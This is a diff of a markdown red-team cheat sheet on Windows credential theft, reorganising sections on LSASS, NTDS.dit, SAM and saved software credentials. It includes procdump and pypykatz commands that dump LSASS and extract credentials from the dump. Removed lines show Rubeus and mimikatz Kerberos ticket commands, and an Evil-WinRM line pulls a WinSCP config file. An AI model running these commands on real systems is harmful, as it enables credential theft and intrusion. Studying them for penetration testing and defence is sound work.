@@ -1,10 +1,10 @@
 ---
 layout: post
-title: TA0006 Credentials Access - Windows
+title: TA0006 Windows - Credentials Steal 
 category: pen
 parent: cheatsheets
 modified_date: 2023-06-08
-permalink: /pen/credsaccess-win
+permalink: /pen/win/creds
 ---
 
 **Mitre Att&ck Entreprise**: [TA0006 - Credentials Access](https://attack.mitre.org/tactics/TA0006/)
@@ -12,20 +12,21 @@ permalink: /pen/credsaccess-win
 **Menu**
 <!-- vscode-markdown-toc -->
 * [tools](#tools)
-* [os](#os)
-	* [kerberos](#kerberos)
+* [dumps](#dumps)
 	* [lsass](#lsass)
+		* [lsass-dump](#lsass-dump)
+		* [lsass-extract](#lsass-extract)
 	* [ntds.dit](#ntds.dit)
 	* [sam](#sam)
-* [services](#services)
 * [schtasks](#schtasks)
 * [softwares](#softwares)
 	* [auto](#auto)
+	* [chrome](#chrome)
 	* [mremoteng](#mremoteng)
 	* [xvnc](#xvnc)
 	* [winscp](#winscp)
 	* [putty](#putty)
-	* [Web Browsers](#WebBrowsers)
+	* [browsers](#browsers)
 
 <!-- vscode-markdown-toc-config
 	numbering=false
@@ -48,52 +49,29 @@ Multi-features Hacking Tools :
     </table>
 </div>
 
-## <a name='os'></a>os
+## <a name='dumps'></a>dumps
 
-### <a name='kerberos'></a>kerberos
-
-* T1558: Steal and Forge Kerberos Tickets 
-* Which OS ? What Creds ?
-
-![Windows Credentials by Auth. Service & by OS](/assets/images/win-delpy-creds-table-by-os-til-2012.png)
-
-TO READ: 
-* [OS credentials dumping - mitre T1003](https://attack.mitre.org/techniques/T1003/001/)
-* [LSA RunAsPPL protection](https://itm4n.github.io/lsass-runasppl/)
-
-* Rubeus compilation / [Wiki](https://github.com/GhostPack/Rubeus) :
-
-```powershell
-# compilation
-```
-
-* Kerberos ASKTGT 
-```powershell
-# Path on VM Mandiant Commando
-cd C:\Tools\GhostPack\Rubeus\Rubeus\bin\Debug
-./Rubeus.exe asktgt /user:$zlat_user /password:"PASSWORD" /domain:$zdom /dc:$zdom_dc_fqdn /ptt
-```
-
-* Import / Export Tickets
-```powershell
-cd C:\tools\mimikatz\x64
-mimikatz.exe privilege:debug
-kerberos::list /export
-```
+* [T1003 - OS credentials dumping](https://attack.mitre.org/techniques/T1003/001/)
 
 ### <a name='lsass'></a>lsass
 
-LSASS.exe dump :
-
+#### <a name='lsass-dump'></a>lsass-dump
+```
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+```
 - [redteamrecipe 50 methods](https://redteamrecipe.com/50-Methods-For-Dump-LSASS/) 🔥
 - [procdump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump)
 
-### <a name='ntds.dit'></a>ntds.dit
+#### <a name='lsass-extract'></a>lsass-extract
+```
+pypykatz lsa minidump lsass.dmp -k /tmp/krb > output.txt
+```
+
+### <a name='ntds.dit'></a>ntds-dit
+### <a name='ntds.dit'></a>ntds-dit-dump
+
 
 ### <a name='sam'></a>sam
-
-* SAM dump
-
 - [registry & vss](https://nored0x.github.io/red-teaming/Windows-Credentials-SAM-Database-part-1/)
 
 ## <a name='schtasks'></a>schtasks
@@ -110,7 +88,7 @@ LSASS.exe dump :
     </table>
 </div>
 
-### chrome
+### <a name='chrome'></a>chrome
 - [chrome / mac os](https://github.com/breakpointHQ/chrome-bandit)
 
 ### <a name='mremoteng'></a>mremoteng
@@ -158,5 +136,5 @@ Evil-winRM > download "C:\Windows\Temp\winscp.ini" /tmp/winscp.ini
 
 ### <a name='putty'></a>putty
 
-### <a name='WebBrowsers'></a>Web Browsers
+### <a name='browsers'></a>browsers
 - [chrome / mac os](https://github.com/breakpointHQ/chrome-bandit)
